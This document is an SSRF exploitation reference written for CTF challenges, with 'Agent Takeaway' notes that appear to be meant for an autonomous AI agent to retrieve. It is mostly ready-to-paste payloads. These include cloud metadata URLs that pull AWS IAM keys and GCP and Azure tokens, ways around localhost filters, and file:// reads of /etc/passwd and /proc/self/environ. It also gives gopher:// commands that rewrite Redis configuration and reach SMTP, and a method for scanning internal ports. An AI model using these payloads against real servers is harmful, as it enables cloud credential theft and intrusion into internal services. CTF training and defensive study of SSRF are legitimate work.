# Server-Side Request Forgery (SSRF) - CTF Exploitation Reference

> **Document Purpose:** Actionable SSRF techniques for CTF challenges.
> Designed for autonomous agent retrieval with copy-paste payloads,
> IP bypass techniques, and cloud metadata exploitation.

---

## 1. QUICK REFERENCE: Detection

> **When to use this section:** You suspect the application fetches URLs or
> resources on behalf of the user.

### 1.1 Detection Indicators

**Tags:** `ssrf, detection, indicators, url-fetch`

Look for these signs:
- Parameters: `?url=`, `?link=`, `?redirect=`, `?fetch=`, `?proxy=`, `?image=`, `?callback=`
- Features: URL preview, link checker, image fetcher, PDF generator, webhook
- Challenge mentions: "fetch", "proxy", "internal", "metadata", "cloud"
- Response includes fetched content from provided URL

### 1.2 Quick Test

**Tags:** `ssrf, quick-test, payloads`

```
http://127.0.0.1
http://localhost
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
```

**Agent Takeaway:**
- SSRF is about making the SERVER fetch a URL you control
- Test with `http://127.0.0.1` first to see if internal access works
- Use `ssrf_probe` tool for automated testing

---

## 2. CLOUD METADATA EXPLOITATION

> **When to use this section:** Target is hosted in a cloud environment
> (AWS, GCP, Azure) and you want to access instance metadata.

### 2.1 AWS Metadata

**Tags:** `ssrf, aws, metadata, cloud, iam`

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

IAM credentials path (two steps):
```
1. http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Returns role name (e.g., "MyRole")
2. http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
   → Returns AccessKeyId, SecretAccessKey, Token
```

### 2.2 GCP Metadata

**Tags:** `ssrf, gcp, metadata, google-cloud`

Requires header: `Metadata-Flavor: Google`
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 2.3 Azure Metadata

**Tags:** `ssrf, azure, metadata, microsoft`

Requires header: `Metadata: true`
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### 2.4 DigitalOcean Metadata

**Tags:** `ssrf, digitalocean, metadata`

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/id
```

**Agent Takeaway:**
- AWS is the most common cloud target in CTFs
- Always try the IAM credentials path — it's the highest value target
- GCP requires a special header which may not be passable via SSRF
- The flag is often in user-data or IAM credentials

---

## 3. IP ADDRESS BYPASS

> **When to use this section:** The application blocks `127.0.0.1` or `localhost`.

### 3.1 Alternative Representations

**Tags:** `ssrf, bypass, ip, obfuscation, localhost`

| Format | Value |
|--------|-------|
| Decimal | `http://2130706433` |
| Hex | `http://0x7f000001` |
| Hex (dotted) | `http://0x7f.0x0.0x0.0x1` |
| Octal | `http://0177.0.0.1` |
| Octal (full) | `http://0177.0000.0000.0001` |
| IPv6 | `http://[::1]` |
| IPv6 mapped | `http://[0:0:0:0:0:ffff:127.0.0.1]` |
| IPv6 short | `http://[::ffff:7f00:1]` |
| Short form | `http://127.1` |
| Zero | `http://0` |

### 3.2 Domain-Based Bypass

**Tags:** `ssrf, bypass, domain, dns, redirect`

```
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
```

### 3.3 URL Tricks

**Tags:** `ssrf, bypass, url-parsing, tricks`

```
http://evil.com@127.0.0.1          (userinfo trick)
http://127.0.0.1#@evil.com         (fragment trick)
http://127.0.0.1%00@evil.com       (null byte)
http://127.0.0.1?@evil.com         (query trick)
http://127。0。0。1                  (fullwidth dot)
http://①②⑦.⓪.⓪.①                (circled numbers)
```

**Agent Takeaway:**
- Decimal IP (`2130706433`) and IPv6 (`[::1]`) are the most reliable bypasses
- `nip.io` resolves any subdomain to the embedded IP — very useful
- URL parsing tricks exploit differences between URL validators and actual fetchers
- Use `ssrf_payload_generator` with `ip_bypass` operation for comprehensive lists

---

## 4. PROTOCOL HANDLERS

> **When to use this section:** HTTP-based SSRF doesn't work or you need
> to access non-HTTP services.

### 4.1 file:// Protocol

**Tags:** `ssrf, protocol, file, local-file-read`

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///flag.txt
file:///var/www/html/config.php
```

### 4.2 gopher:// Protocol

**Tags:** `ssrf, protocol, gopher, internal-service`

Send raw TCP data to internal services:
```
gopher://127.0.0.1:6379/_INFO                    (Redis)
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://127.0.0.1:25/_MAIL%20FROM:<a>%0D%0ARCPT%20TO:<b>  (SMTP)
```

### 4.3 dict:// Protocol

**Tags:** `ssrf, protocol, dict, service-enumeration`

```
dict://127.0.0.1:6379/INFO          (Redis info)
dict://127.0.0.1:11211/stats        (Memcached stats)
```

**Agent Takeaway:**
- `file://` is the simplest — try it first for local file read
- `gopher://` is the most powerful for interacting with internal services
- Most CTFs focus on `file://` and HTTP-based SSRF
- Internal Redis access via SSRF is a common CTF scenario

---

## 5. INTERNAL SERVICE DISCOVERY

> **When to use this section:** You have SSRF and want to discover
> internal services.

### 5.1 Common Internal Ports

**Tags:** `ssrf, internal, port-scan, services`

| Port | Service |
|------|---------|
| 80, 8080, 8443 | HTTP servers |
| 3000 | Node.js / Grafana |
| 5000 | Flask / internal API |
| 6379 | Redis |
| 27017 | MongoDB |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 9200 | Elasticsearch |
| 11211 | Memcached |

Probe with: `http://127.0.0.1:PORT/`

**Agent Takeaway:**
- Scan common ports (80, 8080, 3000, 5000, 6379) first
- Response differences indicate open ports
- Redis (6379) is a high-value target — can lead to RCE
- Use `ssrf_probe` with `targets: "internal"` for automated scanning
